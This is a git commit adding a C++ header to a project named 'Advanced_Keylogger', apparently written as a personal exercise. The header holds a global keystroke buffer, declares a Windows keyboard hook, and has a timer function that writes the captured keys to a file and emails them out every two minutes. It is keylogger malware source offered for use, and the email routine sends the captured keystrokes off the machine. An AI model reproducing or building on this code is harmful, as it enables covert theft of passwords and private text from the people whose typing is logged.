62028bd25ad2d9c2a3b0108e103267a99193d21f
CChalland <ctchalland@gmail.com>
2018-06-24 14:17:43 -0500

    Created a Keyboard Hook header file and so far added global variable for the keylog and a Timer function for sending the emails with the logs

---
+++ Advanced_Keylogger_C++/Advanced_Keylogger/KeybHook.h
@@ -0,0 +1,41 @@
+#pragma once
+#ifndef KEYBHOOK_H
+#define KEYBHOOK_H
+
+#include <iostream>
+#include <fstream>
+#include "windows.h"
+#include "KeyConstants.h"
+#include "Timer.h"
+#include "SendMail.h"
+
+std::string keylog = "";
+
+void TimerSendMail()
+{
+	if (keylog.empty())
+		return;
+	std::string last_file = IO::WriteLog(keylog);
+
+	if (last_file.empty())
+	{
+		Helper::WriteAppLog("File creation was not succesfull. Keylog'" + keylog + "'");
+		return;
+	}
+
+	int x = Mail::SendMail("Log [" + last_file + "]",
+						   "Hi :) \nThe file has been attached to this mail :)\nFor testing, enjoy:)\n" + keylog,
+		                    IO::GetOurPath(true) + last_file);
+	if (x != 7)
+		Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
+	else
+		keylog = "";
+}
+
+Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);
+
+HHOOK eHook = NULL;
+
+
+
+#endif
